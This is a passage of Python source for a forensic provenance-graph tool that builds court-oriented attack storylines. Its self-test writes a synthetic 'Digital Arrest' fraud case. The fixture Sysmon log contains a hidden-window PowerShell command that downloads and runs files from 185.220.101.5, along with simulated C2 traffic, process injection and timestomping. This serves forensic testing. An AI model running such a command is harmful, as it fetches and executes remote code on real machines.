                         "status": "NOT_EVALUATED", "basis": "no Sector B exculpatory checklist bound"})
        core = [r for r in rows if r["id"] in ("D1", "D2", "D3", "D4", "D5")]
        verdict = ("TROJAN_DEFENSE_REBUTTED_ON_RECORD" if all(r["status"] == "REBUTTED" for r in core)
                   and rows[-1]["status"] != "OPEN" else "OPEN_QUESTIONS_REMAIN")
        return {"verdict": verdict, "rows": rows,
                "note": "Each row is answered only from byte-anchored records; OPEN rows must be addressed in testimony."}

    def export_storyline(self, generated_utc: Optional[str] = None, max_nodes: int = 25, lam: float = 2.0,
                         write: bool = True) -> Dict[str, Any]:
        res = self.solve_storyline(max_nodes, lam)
        es = [self.edge(q) for q in res["edges"]]
        order = lambda e: (e["ts"] == 0, e["ts"], e["provenance"]["byte_offset"], self.edge_uid(e))
        actions = sorted((e for e in es if e["rel"] not in BINDING_RELATIONS), key=order)
        binds = sorted((e for e in es if e["rel"] in BINDING_RELATIONS), key=order)
        t0 = next((e["ts"] for e in actions if e["ts"]), 0)
        steps = []
        for i, e in enumerate(actions, 1):
            s = self._step(e, t0)
            steps.append(dict({"step": i}, **s))
        bindings = [self._step(e, t0) for e in binds]
        stages = [{"stage": k, "name": v, "steps": [s["step"] for s in steps if s["stage"] == k]}
                  for k, v in sorted(STAGES.items())]
        files = {s["target"] for s in steps if s["target_kind"] == "FILE"}
        cr = self.causality_report or {}
        warnings = []
        if self.sector_a and self.sector_a.get("admissibility_status") not in (None, "READY_FOR_COURT"):
            warnings.append(f"Sector A acquisition status is {self.sector_a['admissibility_status']}")
        if self.sector_a is None:
            warnings.append("No Sector A evidence manifest bound; bad-sector screening not applied")
        if self.leads_rejected:
            warnings.append(f"{len(self.leads_rejected)} Sector B lead(s) refused for provenance; see attack_graph.json")
        if not self.verify_anchors:
            warnings.append("Anchor verification was DISABLED for this run; not fit for a Section 63 certificate")
        unver = sum(1 for p in _all_anchors(steps + bindings) if p["anchor_reverified"] is not True)
        if unver:
            warnings.append(f"{unver} storyline anchor(s) could not be re-hashed from the evidence on this workstation")
        doc: Dict[str, Any] = {
            "schema": "SUTRA-STORYLINE/1", "version": GRAPH_VERSION, "revision": GRAPH_REVISION, "case_id": self.case_id,
            "generated_utc": generated_utc or ns_to_iso(time.time_ns()),
            "statutory_basis": "Section 63 BSA 2023 certificate (electronic record particulars); Section 45 BSA 2023 "
                               "expert opinion; Sections 105/106 BNSS 2023 (seizure and custody, via Sector A)",
            "sector_a_binding": self.sector_a, "sector_b_binding": self.sector_b,
            "solver": {"algorithm": "Deterministic prize-collecting Steiner tree (greedy shortest-path growth + strong "
                                    "pruning); integer Q16.16 costs", "max_nodes": max_nodes, "lambda": lam,
                       "objective": "minimise sum(L_max - L_rec(e) * gate(e)) + lambda * sum(p(v) for v not in tree)",
                       "tie_break": "physical byte offset Omega(e), then source file, length, relation, node keys",
                       "tree_value_q16": res["value"], "tree_nodes": len(res["nodes"])},
            "nodes": sorted(self.entities.label(v) for v in res["nodes"]),
            "stages": stages, "steps": steps, "identity_bindings": bindings,
            "causality": {"storyline_inversions": len(self.storyline_paradoxes(steps)),
                          "repaired_steps": sum(1 for s in steps if s["timestamp_basis"] == "REPAIRED_LOWER_BOUND"),
                          "graph_inversions_detected": cr.get("paradoxes_detected", 0),
                          "graph_inversions_unresolved": cr.get("unresolved", 0)},
            "timestomp_findings": [f for f in self.timestomp_report["findings"] if f.get("path") in files],
            "defense_challenge_matrix": self.defense_challenge_matrix(steps, bindings),
            "unconnected_clusters": [{"root": self.entities.label(c["root"]), "value_q16": c["value"],
                                      "size": c["size"], "sample": [self.entities.label(v) for v in c["nodes"][:5]]}
                                     for c in res["components"][1:21]],
            "section63_summary": {"hash_algorithm": "SHA-256", "steps": len(steps),
                                  "steps_with_complete_anchor": sum(1 for s in steps if all(
                                      s["provenance"].get(k) not in (None, "") for k in SECTION63_FIELDS)),
                                  "anchors_reverified": sum(1 for p in _all_anchors(steps + bindings)
                                                            if p["anchor_reverified"] is True),
                                  "anchors_total": len(_all_anchors(steps + bindings))},
            "anchor_verification": "REHASHED_FROM_EVIDENCE" if self.verify_anchors else "DISABLED",
            "audit_ledger": self.audit.entries, "audit_genesis": self.audit.genesis,
            "audit_ledger_head_sha256": self.audit.head, "audit_ledger_count": len(self.audit.entries),
            "audit_ledger_hmac": self.audit.key is not None,
            "warnings": warnings,
        }
        doc["storyline_sha256"] = _sha256_hex(canonical_json({k: v for k, v in doc.items() if k != "generated_utc"}))
        if write:
            self._write(STORYLINE_FILENAME, doc)
        return doc

    # ----- attack graph export ---------------------------------------------- #

    def export_attack_graph(self, generated_utc: Optional[str] = None, max_edges: int = 250_000,
                            write: bool = True) -> Dict[str, Any]:
        truncated = 0
        if self.arena.count > max_edges:
            live = heapq.nsmallest(max_edges, self.arena.iter_edges(),
                                   key=lambda x: (not x[1][3] & FLAG_SUSPICIOUS, -x[1][6], x[1][5], x[0]))
            truncated = self.arena.count - max_edges
        else:
            live = list(self.arena.iter_edges())
        used = sorted({v for _, r in live for v in (r[0], r[1])}, key=self.entities.key)
        nid = {v: f"N{i + 1:06d}" for i, v in enumerate(used)}
        prizes = self._derived_prizes()
        nodes = []
        for v in used:
            n = {"id": nid[v], "kind": self.entities.kinds[v], "name": self.entities.names[v],
                 "epoch": self.entities.epochs[v], "label": self.entities.label(v),
                 "prize": q16_to_score(prizes.get(v, 0))}
            if v in self.created_ts:
                n["created_utc"] = ns_to_iso(self.created_ts[v])
            nodes.append(n)
        edges = []
        for seq, (s, d, rel, fl, ts, off, loss) in live:
            e = self.edge(seq)
            item = {"id": self.edge_uid(e), "source": nid[s], "target": nid[d], "relation": RELATION_NAMES[rel],
                    "flags": flag_names(fl), "timestamp_utc": ns_to_iso(ts), "timestamp_ns": ts,
                    "anomaly_score": q16_to_score(loss), "attention_q16": self.supernode.attention_q16(s, rel),
                    "gate_q16": self.supernode.gate_q16(s, rel, min(loss, LOSS_MAX_Q16)),
                    "provenance": {k: e["provenance"][k] for k in ("source_file", "byte_offset", "length", "sha256",
                                                                   "source_type", "offset_basis")}}
            for k, v in sorted(e["meta"].items()):
                item[k] = v
            edges.append(item)
        edges.sort(key=lambda x: (x["timestamp_ns"] == 0, x["timestamp_ns"], x["provenance"]["byte_offset"], x["id"]))
        splits = {n: [self.entities.label(i) for _, i in tl] for n, tl in sorted(self.supernode.splits.items()) if len(tl) > 1}
        doc: Dict[str, Any] = {
            "schema": "SUTRA-T-PKG/1", "version": GRAPH_VERSION, "revision": GRAPH_REVISION, "case_id": self.case_id,
            "generated_utc": generated_utc or ns_to_iso(time.time_ns()),
            "sector_a_binding": self.sector_a, "sector_b_binding": self.sector_b,
            "statistics": {"edges_ingested_total": self.arena.next_seq, "edges_live": self.arena.count,
                           "edges_evicted": self.arena.evicted, "edges_exported": len(edges), "edges_truncated": truncated,
                           "nodes_exported": len(nodes), "entities_total": len(self.entities),
                           "edges_rejected": sum(self.rejected_count.values()),
                           "arena_capacity": self.arena.capacity, "arena_bytes": self.arena.nbytes,
                           "edge_record_bytes": CSRGraphArena.RECORD_SIZE,
                           "ledger_bytes_in_ram": self.ledger.nbytes_in_ram,
                           "anchors_reverified": self.anchor_stats["verified"],
                           "anchors_not_verified": self.anchor_stats["not_verified"],
                           "anchor_verification": "REHASHED_FROM_EVIDENCE" if self.verify_anchors else "DISABLED",
                           "file_intents_unconfirmed": self.unconfirmed_intents},
            "nodes": nodes, "edges": edges, "broker_epochs": splits,
            "timestomp_analysis": self.timestomp_report, "causality": self.causality_report,
            "audit_ledger": self.audit.entries, "audit_genesis": self.audit.genesis,
            "audit_ledger_head_sha256": self.audit.head, "audit_ledger_count": len(self.audit.entries),
            "rejected_edges": {"by_reason": dict(sorted(self.rejected_count.items())), "examples": self.rejected[:50]},
            "leads_rejected": self.leads_rejected,
            "lead_index": {lid: [self.edge_uid(self.edge(q)) for q in qs if self.arena.is_live(q)]
                           for lid, qs in sorted(self.lead_edges.items())},
        }
        doc["graph_sha256"] = _sha256_hex(canonical_json({k: v for k, v in doc.items() if k != "generated_utc"}))
        if write:
            self._write(ATTACK_GRAPH_FILENAME, doc)
        return doc

    def _write(self, name: str, doc: Dict[str, Any]) -> str:
        os.makedirs(self.output_dir, exist_ok=True)
        path = os.path.join(self.output_dir, name)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(doc, f, indent=2, sort_keys=True, ensure_ascii=False, allow_nan=False)
            f.write("\n")
        return path

    def close(self) -> None:
        self.ledger.close()


# --------------------------------------------------------------------------- #
# Schema validators (used by Sectors D and E before trusting the files)       #
# --------------------------------------------------------------------------- #

def _anchor_ok(p: Any) -> bool:
    return (isinstance(p, dict) and bool(p.get("source_file")) and isinstance(p.get("byte_offset"), int)
            and p["byte_offset"] >= 0 and isinstance(p.get("length"), int) and p["length"] > 0
            and bool(re.fullmatch(r"[0-9a-f]{64}", str(p.get("sha256")))))


def _all_anchors(rows: Sequence[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Every Section 63 anchor of a storyline row list: the primary and each secondary anchor."""
    out = []
    for r in rows:
        out.append(r["provenance"])
        out.extend(v for _k, v in sorted((r.get("secondary_anchors") or {}).items()))
    return out


def _audit_errors(doc: Dict[str, Any], key: Optional[bytes]) -> List[str]:
    if "audit_ledger" not in doc or "audit_ledger_head_sha256" not in doc or "audit_ledger_count" not in doc:
        return ["missing audit ledger head/count"]
    ok = AuditLedger.verify(doc["audit_ledger"], doc.get("audit_genesis", "0" * 64), doc["audit_ledger_head_sha256"],
                            doc["audit_ledger_count"], key)
    errs = [] if ok else ["audit ledger chain does not verify (altered, re-rooted or truncated)"]
    if doc.get("sector_a_binding") and doc.get("audit_genesis") != doc["sector_a_binding"].get("master_case_root_v3"):
        errs.append("audit ledger is not rooted in the Sector A master case root")
    return errs


def validate_attack_graph(doc: Dict[str, Any], audit_key: Optional[bytes] = None) -> List[str]:
    errs = []
    for k in ("schema", "version", "case_id", "statistics", "nodes", "edges", "graph_sha256"):
        if k not in doc:
            errs.append(f"missing {k}")
    if errs:
        return errs
    if doc["schema"] != "SUTRA-T-PKG/1":
        errs.append("schema mismatch")
    ids = set()
    for n in doc["nodes"]:
        if n.get("kind") not in ENTITY_KINDS or not n.get("id") or n["id"] in ids:
            errs.append(f"bad node {n.get('id')}")
        ids.add(n.get("id"))
    for e in doc["edges"]:
        if e.get("source") not in ids or e.get("target") not in ids:
            errs.append(f"edge {e.get('id')} references an unknown node")
        if e.get("relation") not in RELATION_BY_NAME:
            errs.append(f"edge {e.get('id')} has unknown relation")
        if not _anchor_ok(e.get("provenance")):
            errs.append(f"edge {e.get('id')} lacks a complete physical anchor")
    errs.extend(_audit_errors(doc, audit_key))
    body = {k: v for k, v in doc.items() if k not in ("graph_sha256", "generated_utc")}
    if _sha256_hex(canonical_json(body)) != doc["graph_sha256"]:
        errs.append("graph_sha256 does not match content")
    return errs


def validate_storyline(doc: Dict[str, Any], max_nodes: int = 25, require_reverified: bool = True,
                       audit_key: Optional[bytes] = None) -> List[str]:
    """
    Checks a Sector D certificate relies on. With require_reverified (default), every anchor in the
    storyline (step, binding and secondary) must say anchor_reverified: true.
    """
    errs = []
    for k in ("schema", "case_id", "steps", "identity_bindings", "nodes", "causality", "defense_challenge_matrix",
              "storyline_sha256"):
        if k not in doc:
            errs.append(f"missing {k}")
    if errs:
        return errs
    if len(doc["nodes"]) > max_nodes:
        errs.append(f"{len(doc['nodes'])} nodes exceeds {max_nodes}")
    for i, s in enumerate(doc["steps"], 1):
        for k in STORYLINE_STEP_FIELDS:
            if k not in s:
                errs.append(f"step {i}: missing {k}")
        if s.get("step") != i:
            errs.append(f"step numbering broken at {i}")
        p = s.get("provenance", {})
        if not _anchor_ok(p) or any(k not in p for k in SECTION63_FIELDS):
            errs.append(f"step {i}: incomplete Section 63 anchor")
    for b in doc["identity_bindings"]:
        if not _anchor_ok(b.get("provenance")):
            errs.append("identity binding without anchor")
    if require_reverified:
        if doc.get("anchor_verification") != "REHASHED_FROM_EVIDENCE":
            errs.append("anchors were not re-hashed from the evidence (verification disabled)")
        bad = sum(1 for p in _all_anchors(doc["steps"] + doc["identity_bindings"]) if p.get("anchor_reverified") is not True)
        if bad:
            errs.append(f"{bad} anchor(s) not re-verified against the evidence")
    errs.extend(_audit_errors(doc, audit_key))
    if TemporalProvenanceGraph.storyline_paradoxes(doc["steps"]):
        errs.append("storyline contains causality inversions")
    body = {k: v for k, v in doc.items() if k not in ("storyline_sha256", "generated_utc")}
    if _sha256_hex(canonical_json(body)) != doc["storyline_sha256"]:
        errs.append("storyline_sha256 does not match content")
    return errs


def build_from_sector_outputs(evidence_manifest: Optional[str], triage_manifest: str, evidence_root: Optional[str],
                              output_dir: str, case_id: Optional[str] = None,
                              generated_utc: Optional[str] = None, case_bindings: Optional[str] = None,
                              ledger_path: Optional[str] = None, artifact_paths: Optional[Dict[str, str]] = None
                              ) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    """
    Real-data entry point: Sector A + Sector B outputs (+ optional case-document bindings) ->
    attack_graph.json + incident_storyline.json. The anchor ledger lives on disk next to the outputs.
    """
    with open(triage_manifest, "r", encoding="utf-8") as f:
        tm = json.load(f)
    os.makedirs(output_dir, exist_ok=True)
    g = TemporalProvenanceGraph(case_id=case_id or tm.get("case_id") or "UNKNOWN", output_dir=output_dir,
                                evidence_root=evidence_root or os.path.dirname(os.path.abspath(triage_manifest)),
                                verify_anchors=True, artifact_paths=artifact_paths,
                                ledger_path=ledger_path or os.path.join(output_dir, "provenance_ledger.ring"))
    try:
        if evidence_manifest:
            g.ingest_evidence_manifest(evidence_manifest)
        g.ingest_triage_manifest(tm)
        if case_bindings:
            g.ingest_case_bindings(case_bindings)
        g.check_causality()
        return g.export_attack_graph(generated_utc), g.export_storyline(generated_utc)
    finally:
        g.close()


# --------------------------------------------------------------------------- #
# Synthetic "Digital Arrest" case for the self-test                           #
# --------------------------------------------------------------------------- #

def _t(s: str) -> int:
    return iso_to_ns(s)


def _write_lines(path: str, lines: Sequence[str]) -> Dict[str, Tuple[int, int]]:
    """Write lines (LF) and return {line text: (offset, length)}."""
    pos, out = 0, {}
    with open(path, "wb") as f:
        for ln in lines:
            b = ln.encode("utf-8")
            out[ln] = (pos, len(b))
            f.write(b + b"\n")
            pos += len(b) + 1
    return out


def _write_digital_arrest_case(d: str) -> Dict[str, Any]:
    """Six evidence files with one consistent attack plus background noise. Returns paths and expected anchors."""
    os.makedirs(d, exist_ok=True)
    rng = random.Random(2026)
    exp: Dict[str, Any] = {}

    # 1. WhatsApp Desktop voip log
    call = ('2026-10-14T05:58:03.118Z voip call-id=wa_call_77 dir=incoming from=+919812300001 '
            'name="Inspector Vikram (CBI Mumbai)" to=+919900000077 local_user=VICTIM-PC\\rahul video=1')
    wa = ["2026-10-14T05:10:00.004Z app startup version=2.2440.9",
          '2026-10-14T05:20:00.000Z voip call-id=wa_call_70 dir=incoming from=+919811111111 name="Amma" '
          'to=+919900000077 local_user=VICTIM-PC\\rahul video=0', call,
          "2026-10-14T06:40:00.000Z voip call-id=wa_call_77 ended duration=2517s"]
    offs = _write_lines(os.path.join(d, "whatsapp_desktop.log"), wa)
    exp["call"] = ("whatsapp_desktop.log",) + offs[call]

    # 2. Sysmon (JSON-lines export)
    ev: List[Dict[str, Any]] = []
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 05:00:00.000", "Image": "C:\\Windows\\System32\\svchost.exe",
               "ProcessId": 812, "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": 600,
               "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "User": "NT AUTHORITY\\SYSTEM"})
    for i in range(400):
        t = _t("2026-10-14T05:00:01Z") + i * 8 * NS + rng.randrange(NS)
        img = ("wuauclt.exe", "backgroundtaskhost.exe", "taskhostw.exe", "wermgr.exe")[i % 4]
        ev.append({"EventID": 1, "UtcTime": ns_to_iso(t)[:23].replace("T", " "),
                   "Image": f"C:\\Windows\\System32\\{img}", "ProcessId": 2000 + i,
                   "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": 812,
                   "CommandLine": f"C:\\Windows\\System32\\{img} /background", "User": "NT AUTHORITY\\SYSTEM"})
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 05:40:00.000", "Image": "C:\\Windows\\explorer.exe",
               "ProcessId": 1500, "ParentImage": "C:\\Windows\\System32\\userinit.exe", "ParentProcessId": 1400,
               "CommandLine": "C:\\Windows\\Explorer.EXE", "User": "VICTIM-PC\\rahul"})
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 06:05:00.000",
               "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ProcessId": 4100,
               "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": 1500,
               "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", "User": "VICTIM-PC\\rahul"})
    ps_cmd = ("powershell.exe -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile("
              "'http://185.220.101.5/a.exe','C:\\Users\\Public\\a.exe'); (New-Object Net.WebClient).DownloadFile("
              "'http://185.220.101.5/s.ps1','C:\\Users\\Public\\s.ps1'); Start-Process C:\\Users\\Public\\a.exe\"")
    spawn_ps = {"EventID": 1, "UtcTime": "2026-10-14 06:10:05.000",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": 4321,
                "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentProcessId": 4100,
                "CommandLine": ps_cmd, "User": "VICTIM-PC\\rahul"}
    ev.append(spawn_ps)
    ev.append({"EventID": 3, "UtcTime": "2026-10-14 06:10:09.990",
               "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": 4321,
               "SourceIp": "192.168.1.5", "SourcePort": 50100, "DestinationIp": "185.220.101.5", "DestinationPort": 80})
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 06:10:12.000", "Image": "C:\\Users\\Public\\a.exe",
               "ProcessId": 5200, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "ParentProcessId": 4321, "CommandLine": "C:\\Users\\Public\\a.exe", "User": "VICTIM-PC\\rahul"})
    ev.append({"EventID": 3, "UtcTime": "2026-10-14 06:10:14.040", "Image": "C:\\Users\\Public\\a.exe",
               "ProcessId": 5200, "SourceIp": "192.168.1.5", "SourcePort": 50110, "DestinationIp": "185.220.101.5",
               "DestinationPort": 443})
    ev.append({"EventID": 8, "UtcTime": "2026-10-14 06:10:20.000", "SourceImage": "C:\\Users\\Public\\a.exe",
               "SourceProcessId": 5200, "TargetImage": "C:\\Windows\\System32\\svchost.exe", "TargetProcessId": 812})
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 06:10:25.000", "Image": "C:\\Windows\\System32\\rundll32.exe",
               "ProcessId": 6100, "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": 812,
               "CommandLine": "rundll32.exe C:\\Users\\Public\\x.dll,Start", "User": "NT AUTHORITY\\SYSTEM"})
    ev.append({"EventID": 1, "UtcTime": "2026-10-14 06:12:00.000", "Image": "C:\\Windows\\System32\\wermgr.exe",
               "ProcessId": 6200, "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": 812,
               "CommandLine": "C:\\Windows\\System32\\wermgr.exe -upload", "User": "NT AUTHORITY\\SYSTEM"})
    ev.sort(key=lambda e: e["UtcTime"])
    lines = [json.dumps(e, sort_keys=True) for e in ev]
    offs = _write_lines(os.path.join(d, "sysmon.jsonl"), lines)
    exp["chrome_ps"] = ("sysmon.jsonl",) + offs[json.dumps(spawn_ps, sort_keys=True)]

    # 3. Disk image with an $MFT extent and a $UsnJrnl:$J extent
    ft = lambda s: ns_to_filetime(_t(s))
    true_create = ft("2026-10-14T06:10:11.4821337Z")
    stomp_time = ft("2026-10-14T06:10:30.1234567Z")
    old = ft("2019-03-01T00:00:00Z")
    mft_base, usn_base = 0x40000, 0x80000
    jentries = [
        (42 | (1 << 48), 31, ft("2026-10-13T18:00:00.1234567Z"), USN_REASON_FILE_CREATE, "copied_photo.jpg"),
        (42 | (1 << 48), 31, ft("2026-10-13T18:00:00.2234567Z"), USN_REASON_CLOSE | USN_REASON_FILE_CREATE, "copied_photo.jpg"),
        (40 | (1 << 48), 31, true_create, USN_REASON_FILE_CREATE, "a.exe"),
        (40 | (1 << 48), 31, ft("2026-10-14T06:10:11.6000001Z"), USN_REASON_DATA_EXTEND, "a.exe"),
        (40 | (1 << 48), 31, ft("2026-10-14T06:10:11.7000001Z"), USN_REASON_CLOSE | USN_REASON_DATA_EXTEND, "a.exe"),
        (40 | (1 << 48), 31, stomp_time, USN_REASON_BASIC_INFO_CHANGE, "a.exe"),
    ]
    jstream = build_usn_stream(jentries, sparse_prefix=0x1000)
    a_exe_usn = parse_usn_journal(jstream)["creates"][40]["usn"]
    recs = {
        5: build_mft_record(5, ".", 5, [ft("2024-01-01T00:00:00.1000001Z")] * 4, [ft("2024-01-01T00:00:00.1000001Z")] * 4,
                            0x100, 0x10, is_dir=True),
        30: build_mft_record(30, "Users", 5, [ft("2024-01-01T00:01:00.2000001Z")] * 4,
                             [ft("2024-01-01T00:01:00.2000001Z")] * 4, 0x200, 0x20, is_dir=True),
        31: build_mft_record(31, "Public", 30, [ft("2024-01-01T00:02:00.3000001Z")] * 4,
                             [ft("2024-01-01T00:02:00.3000001Z")] * 4, 0x300, 0x30, is_dir=True),
        41: build_mft_record(41, "report_2024.docx", 31, [ft("2024-05-02T10:11:12.3456789Z")] * 4,
                             [ft("2024-05-02T10:11:12.3456789Z")] * 4, 0x500, 0x100, size=20480),
        43: build_mft_record(43, "notes.txt", 31, [ft("2026-10-01T08:00:00.5550001Z")] * 4,
                             [ft("2026-10-01T08:00:00.5550001Z")] * 4, 0x7000, 0x1700, size=512),
        42: build_mft_record(42, "copied_photo.jpg", 31,
                             [ft("2026-10-13T18:00:00.1234567Z"), ft("2023-01-01T09:09:09.9876543Z"),
                              ft("2026-10-13T18:00:00.1234567Z"), ft("2026-10-13T18:00:00.1234567Z")],
                             [ft("2026-10-13T18:00:00.1234567Z")] * 4, 0x8000, 0x1800, size=3_000_000),
        # s.ps1: $SI and $FN both rewritten to 2019 (raw-disk stomp) and no journal: only I5 can catch it
        44: build_mft_record(44, "s.ps1", 31, [ft("2019-03-01T00:00:00.1234567Z")] * 4,
                             [ft("2019-03-01T00:00:00.1234567Z")] * 4, 0x50, 0x8, size=2048),
        40: build_mft_record(40, "a.exe", 31, [old, old, stomp_time, old], [true_create] * 4, 0x9000, a_exe_usn + 0x100,
                             size=73_728),
    }
    img = bytearray(1 << 20)
    for n, r in recs.items():
        img[mft_base + n * 1024:mft_base + (n + 1) * 1024] = r
    img[usn_base:usn_base + len(jstream)] = jstream
    for i in range(0, 0x40000, 4096):
        img[i:i + 16] = hashlib.sha256(i.to_bytes(4, "big")).digest()[:16]
    with open(os.path.join(d, "victim_disk.img"), "wb") as f:
        f.write(img)
    exp["mft_a_exe"] = ("victim_disk.img", mft_base + 40 * 1024, 1024)
    exp["ntfs"] = {"mft_offset": mft_base, "mft_length": 64 * 1024, "usn_offset": usn_base, "usn_length": len(jstream),
                   "jstream": jstream, "a_exe_true_create_ns": filetime_to_ns(true_create)}

    # 4. Packet capture: background TLS plus the download and the C2 handshake
    pk = []
    for i in range(60):
        pk.append((_t("2026-10-14T05:30:00Z") + i * 61 * NS, "192.168.1.5", 49000 + i,
                   f"142.250.{i % 7}.{10 + i}", 443, 0x02))
    ps_syn = _t("2026-10-14T06:10:10.000Z")
    c2_syn = _t("2026-10-14T06:10:14.050Z")
    pk += [(ps_syn, "192.168.1.5", 50100, "185.220.101.5", 80, 0x02),
           (ps_syn + 30_000_000, "185.220.101.5", 80, "192.168.1.5", 50100, 0x12),
           (c2_syn, "192.168.1.5", 50110, "185.220.101.5", 443, 0x02)]
    pk.sort()
    pcap = build_pcap(pk)
    with open(os.path.join(d, "network_capture.pcap"), "wb") as f:
        f.write(pcap)
    pos, idx = 24, None
    for p in pk:
        flen = 14 + 20 + 20
        if p[0] == c2_syn:
            idx = (pos, 16 + flen)
        pos += 16 + flen
    exp["c2"] = ("network_capture.pcap",) + idx
    exp["ps_syn_ns"] = ps_syn

    # 5. Bank statement
    row = "B2,2026-10-14T06:15:00.000Z,+919900000077,rahul@okhdfc,hub.kyc@ybl,250000.00,NETBANKING"
    bank = ["txn_id,timestamp_utc,holder_mobile,payer_vpa,payee_vpa,amount_inr,channel",
            "B1,2026-10-10T12:00:00.000Z,+919900000077,rahul@okhdfc,grocer@okicici,1200.00,UPI",
            row, "B3,2026-10-15T09:00:00.000Z,+919900000077,rahul@okhdfc,electricity@okaxis,2300.00,UPI"]
    offs = _write_lines(os.path.join(d, "bank_statement.csv"), bank)
    exp["bank"] = ("bank_statement.csv",) + offs[row]

    # 6. NPCI switch log
    hub1 = "2026-10-14T06:15:20.000Z RRN=628711000102 PAYER=hub.kyc@ybl PAYEE=mule1@ybl AMT=62000.00 RESP=00"
    npci = ["2026-10-14T06:01:00.000Z RRN=628711000090 PAYER=someone@okicici PAYEE=shop@ybl AMT=450.00 RESP=00",
            hub1,
            "2026-10-14T06:15:41.000Z RRN=628711000103 PAYER=hub.kyc@ybl PAYEE=mule2@paytm AMT=61500.00 RESP=00",
            "2026-10-14T06:16:02.000Z RRN=628711000104 PAYER=hub.kyc@ybl PAYEE=mule3@okaxis AMT=60000.00 RESP=00",
            "2026-10-14T06:16:20.000Z RRN=628711000105 PAYER=hub.kyc@ybl PAYEE=mule4@ibl AMT=61500.00 RESP=00",
            "2026-10-14T06:30:00.000Z RRN=628711000120 PAYER=other@okicici PAYEE=shop@ybl AMT=99.00 RESP=00"]
    offs = _write_lines(os.path.join(d, "npci_switch.log"), npci)
    exp["npci_hub"] = ("npci_switch.log",) + offs[hub1]
    return exp


def _ingest_digital_arrest(g: TemporalProvenanceGraph, d: str, exp: Dict[str, Any]) -> None:
    g.ingest_whatsapp_desktop_log(os.path.join(d, "whatsapp_desktop.log"))
    g.ingest_sysmon_jsonl(os.path.join(d, "sysmon.jsonl"))
    g.ingest_pcap(os.path.join(d, "network_capture.pcap"))
    n = exp["ntfs"]
    g.ingest_ntfs(os.path.join(d, "victim_disk.img"), n["mft_offset"], n["mft_length"], n["usn_offset"], n["usn_length"])
    g.ingest_bank_statement_csv(os.path.join(d, "bank_statement.csv"))
    g.ingest_npci_switch_log(os.path.join(d, "npci_switch.log"))
    g.finalize_ingest()


# --------------------------------------------------------------------------- #
# Self-test                                                                   #
# --------------------------------------------------------------------------- #

def _fake_anchor(i: int, src: str = "telemetry.bin") -> Dict[str, Any]:
    return {"source_file": src, "byte_offset": i * 64, "length": 64,
            "sha256": hashlib.sha256(f"{src}:{i}".encode()).hexdigest(), "source_type": "TEST"}


def _run_sector_b_case(workdir: str, case_id: str, bad_sectors: Optional[List[int]] = None
                       ) -> Tuple[Optional[str], Optional[str], Optional[bytes]]:
    """Vault Sector B's synthetic case bundle with Sector A and triage it with Sector B. Returns manifest paths."""
    if _sector_a is None or _sector_b is None:
        return None, None, None
    os.makedirs(workdir, exist_ok=True)
    bundle = _sector_b._build_case_bundle()
    layout, blob = {}, bytearray()
    for name, data in bundle.items():
        pos = (len(blob) + 4095) // 4096 * 4096
        blob.extend(bytes(pos - len(blob)))
        layout[name] = (pos, len(data))
        blob.extend(data)
    blob.extend(bytes((-len(blob)) % 4096))
    image = os.path.join(workdir, "case_bundle.img")
    with open(image, "wb") as f:
        f.write(blob)
    vault = _sector_a.SutraEvidenceVault(case_id=case_id, output_dir=os.path.join(workdir, "sector_a"))
    vault.ingest_evidence(image, bad_sector_mask=bad_sectors)
    a_path = os.path.join(workdir, "sector_a", SECTOR_A_MANIFEST)
    orch = _sector_b.SutraNeuralTriageOrchestrator(case_id, output_dir=workdir, device_owner="rahul")
    orch.bind_sector_a_manifest(a_path)
    kinds = {"events": ("process_events_jsonl", "SYSMON_EVENT_LOG_JSONL"),
             "whatsapp": ("whatsapp_log", "ANDROID_WHATSAPP_LOG"), "rppg": ("rppg_trace", "VIDEO_CALL_ROI_TRACE"),
             "registry": ("registry_export", "WINDOWS_REGISTRY_EXPORT"),
             "anydesk": ("anydesk_trace", "ANYDESK_CONNECTION_TRACE"), "upi": ("upi_csv", "UPI_TRANSACTION_EXPORT"),
             "chain": ("chain_csv", "BLOCKCHAIN_TRANSFER_EXPORT"), "chat": ("chat_transcript", "CHAT_TRANSCRIPT_TEXT"),
             "bugreport": ("bugreport", "ANDROID_BUGREPORT"), "apk": ("apk", "ANDROID_APK_FILE")}
    for name, (kind, stype) in kinds.items():
        off, ln = layout[name]
        orch.add_artifact(name, kind, stype, path=image, base_offset=off, length=ln, extent=True,
                          display_path="case_bundle.img")
    orch.run(triage_time_utc="2026-10-20T14:30:00.000Z")
    return a_path, os.path.join(workdir, SECTOR_B_MANIFEST), bytes(blob)


def _write_case_bindings(d: str, extra: Sequence[Dict[str, Any]] = ()) -> str:
    """Two examiner documents and the attribution links they state, for the Sector A/B case."""
    kyc = ("HDFC Bank Ltd - Nodal Officer reply to notice u/s 94 BNSS, ref FIR-042/2026-CYBER\n"
           "1. Account holder: Rahul (customer ID 50100XXXX).\n"
           "2. VPA rahul@okhdfc is device-bound to the handset seized under memo SZ-17 (IMEI 356789104512347).\n"
           "3. Device binding created 2025-02-11; no re-binding since.\n")
    memo = ("Seizure memo SZ-17, 2026-10-15\n"
            "Item 1: Android handset, IMEI 356789104512347, imaged by Sector A.\n"
            "Item 2: APK sample (artifact apk) was extracted from the seized Android handset at 11:40.\n")
